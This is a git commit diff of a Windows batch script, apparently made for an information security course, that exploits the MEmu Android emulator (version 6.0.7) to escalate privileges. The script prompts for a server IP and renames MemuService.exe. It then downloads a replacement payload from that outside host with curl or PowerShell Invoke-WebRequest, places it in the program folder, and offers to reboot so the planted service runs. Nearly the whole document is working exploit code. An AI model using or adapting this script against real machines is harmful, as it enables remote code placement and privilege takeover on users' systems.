80b35e7eb0b2b5f6f70aeae666381cdae0793323
Roby and Gerry <robyandgerry@iMac-di-Roby.local>
2020-06-01 23:55:23 +0200

    Win script updated

--- MemuPlay6.0.7-PrivilegeEscalation(PoC)/win_malicious.bat
+++ MemuPlay6.0.7-PrivilegeEscalation(PoC)/win_malicious.bat
@@ -1,13 +1,14 @@
 @echo off
 
-echo "---- [\./] Memu Windows Exploit [\./] -----"
-echo "---- . . p r e s s  a n y  k e y  . . -----"
+echo "---- Memu Windows Exploit -----"
+echo "---- InfoSec Course UNIBZ -----"
+echo "---- [ press any key... ] -----"
 
 pause>nul 
 
 :BEGIN 
 
-set /p _ip= Please enter server's ip:
+set /p _ip= Please enter server's ip: 
 
 set _url= "http://%_ip%/MemuService.exe"
 
@@ -16,16 +17,16 @@ echo %_url%
 
 set /p _ans= Do you want to continue? [y/n or quit]
 
-if "%_ans%" == "y" (GOTO CHECKPATH) else if "%_ans%" == "quit" (GOTO FINISH) else (GOTO BEGIN)
+if "%_ans%" == "y" (GOTO CHECKPATH) else if "%_ans%" == "quit" (GOTO END) else (GOTO BEGIN)
 
 pause>nul
 
 
 :CHECKPATH
 
-if exist "C:\ProgramFiles(x86)\Microvirt\MEmu\" GOTO FIRSTPATH
+if exist "C:\Program Files (x86)\Microvirt\MEmu\" GOTO FIRSTPATH
 
-if exist "C:\ProgramFiles\Microvirt\MEmu\" GOTO SECONDPATH
+if exist "C:\Program Files\Microvirt\MEmu\" GOTO SECONDPATH
 
 echo "PATH ERROR, check your program's installation path. Enter any key to close."
 
@@ -36,11 +37,21 @@ GOTO FINISH
 
 :FIRSTPATH
 
-ren C:\ProgramFiles(x86)\Microvirt\MEmu\MemuService.exe MemuService.bak
+set target=C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe
 
-cd C:\ProgramFiles(x86)\Microvirt\MEmu\ && { curl  "%_url%" --output MemuService.exe ; cd -; }
+echo "Process refactor: "
 
-echo "Payload placed, now restart the system."
+ren "C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe" MemuService.bak
+
+echo "DONE"
+
+echo "Payload injection: "
+
+powershell -Command "Invoke-WebRequest -Uri %_url% -OutFile '%target%'"
+
+echo "DONE"
+
+echo "Now restart the system."
 
 pause>nul
 
@@ -50,14 +61,25 @@ GOTO FINISH
 
 :SECONDPATH
 
-ren C:\ProgramFiles\Microvirt\MEmu\MemuService.exe MemuService.bak
+set target=C:\Program Files\Microvirt\MEmu\MemuService.exe
 
-cd C:\ProgramFiles\Microvirt\MEmu\ && { curl  "%_url%" --output MemuService.exe ; cd -; }
+echo "Process refactor: "
 
-echo "Payload placed, now restart the system."
+ren "C:\Program Files\Microvirt\MEmu\MemuService.exe" MemuService.bak
 
-pause>nul
+echo "DONE"
+
+echo "Payload injection: "
+
+powershell -Command "Invoke-WebRequest -Uri %_url% -OutFile '%target%'"
+
+echo "DONE"
 
 
 :FINISH
 
+set /p _shut= Process finished, please choose to restart(r), shutdown(s) or end the script with any key.
+
+if "%_shut%" == "r" (shutdown.exe /r /t 00) else if "%_shut%" == "s" (shutdown.exe /s /t 00)
+
+:END
